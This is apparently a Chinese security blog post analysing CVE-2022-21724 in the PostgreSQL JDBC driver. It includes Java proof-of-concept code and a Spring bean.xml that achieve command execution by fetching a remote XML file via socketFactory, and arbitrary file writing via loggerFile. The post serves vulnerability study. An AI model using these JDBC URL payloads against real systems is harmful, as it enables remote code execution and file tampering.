# Java JDBC Attack-PostgresQL

  
  
&lt;!--more--&gt;  
## 0x01 PostgreSQL漏洞  
PostgreSQL的property也存在安全问题CVE-2022-21724  
在 PostgreSQL 数据库的 JDBC 驱动程序中存在一个安全漏洞。当攻击者控制 JDBC URL 或者属性时，使用 PostgreSQL 数据库的系统将受到攻击。  
PgJDBC根据`authenticationPluginClassName`、`sslhostnameverifier`、`socketFactory` 、`sslfactory`、`sslpasswordcallback`连接属性提供类型实例化插件实例。但是。驱动程序在实例化类之前没有验证类是否实现了预期的接口。这可能导致 RCE  
影响范围：  
　　9.4.1208 &lt;=PgJDBC &lt;42.2.25  
　　42.3.0 &lt;=PgJDBC &lt; 42.3.2  
这里主要记录两个点  
- socketFactory / socketFactoryArg 等property调用有参构造触发的RCE  
- loggerLevel / loggerFile 日志功能写文件  
## 0x02 漏洞分析&amp;POC  
pom.xml  
```xml  
&lt;!-- https://mvnrepository.com/artifact/org.postgresql/postgresql --&gt;  
&lt;dependency&gt;  
    &lt;groupId&gt;org.postgresql&lt;/groupId&gt;  
    &lt;artifactId&gt;postgresql&lt;/artifactId&gt;  
    &lt;version&gt;42.3.1&lt;/version&gt;  
&lt;/dependency&gt;  
&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context-support --&gt;  
&lt;dependency&gt;  
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;  
    &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt;  
    &lt;version&gt;5.3.23&lt;/version&gt;  
&lt;/dependency&gt;  
```  
demo  
```java  
import java.sql.Connection;    
import java.sql.DriverManager;    
import java.sql.SQLException;    
    
public class JDBC_Postgresql {    
    public static void main(String[] args) throws SQLException {    
        String socketFactoryClass = &#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;;    
        String socketFactoryArg = &#34;http://127.0.0.1:8080/bean.xml&#34;;    
        String jdbcUrl = &#34;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&#34;&#43;socketFactoryClass&#43; &#34;&amp;socketFactoryArg=&#34;&#43;socketFactoryArg;    
        Connection connection = DriverManager.getConnection(jdbcUrl);    
    }    
}  
```  
bean.xml  
```xml  
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;  
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;  
       xmlns:p=&#34;http://www.springframework.org/schema/p&#34;  
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans  
        http://www.springframework.org/schema/beans/spring-beans.xsd&#34;&gt;  
&lt;!--    普通方式创建类--&gt;  
   &lt;bean id=&#34;exec&#34; class=&#34;java.lang.ProcessBuilder&#34; init-method=&#34;start&#34;&gt;  
        &lt;constructor-arg&gt;  
          &lt;list&gt;  
            &lt;value&gt;bash&lt;/value&gt;  
            &lt;value&gt;-c&lt;/value&gt;  
            &lt;value&gt;open -a Calculator&lt;/value&gt;  
          &lt;/list&gt;  
        &lt;/constructor-arg&gt;  
    &lt;/bean&gt;  
&lt;/beans&gt;  
```  
### **任意代码执行 socketFactory/socketFactoryArg**  
大概流程  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162316543.png)
通过大概流程就可以看出，直接看 sink 点，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162325438.png)
这里的`ctor`类和`args`参数均为可控。满足构造方法中有且只有一个 String 参数的类就可以满足条件。  
- org.apache.commons.jxpath.functions.ConstructorFunction  
- org.apache.commons.jxpath.functions.MethodFunction  
- java.io.FileOutputStream  
通过`CVE-2017-17485`实现 Spring Spel 执行任意命令或者利用 FileOutputStream 将任意文件置空  
### **任意代码执行sslfactory/sslfactoryarg**  
大概流程  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162327024.png)
和上面的漏洞形成方式一致，sink 点也类似  
### **任意文件写入loggerLevel/LoggerFile**  
Demo  
```java  
import java.sql.Connection;    
import java.sql.DriverManager;    
import java.sql.SQLException;    
    
public class JDBC_Postgresql_File {    
    public static void main(String[] args) throws SQLException {    
        String loggerLevel = &#34;debug&#34;;    
        String loggerFile = &#34;test.txt&#34;;    
        String shellContent=&#34;test&#34;;    
        String jdbcUrl = &#34;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&#34;&#43;loggerLevel&#43;&#34;&amp;loggerFile=&#34;&#43;loggerFile&#43; &#34;&amp;&#34;&#43;shellContent;    
        Connection connection = DriverManager.getConnection(jdbcUrl);    
    }    
}  
```  
断点调试一下，依然是跟进到`org.postgresql.Driver#connect()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162333063.png)
进入到`setupLoggerFromProperties()`方法中  
通过`LOGGER_FILE`指定日志文件保存位置，没有进行校验，导致可以跨目录保存文件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162337783.png)
利用了`setupLoggerFromProperties()`设定了相关的参数，再利用`LOGGER.log`保存了文件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162339486.png)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/java-jdbc-attack-postgresql/  

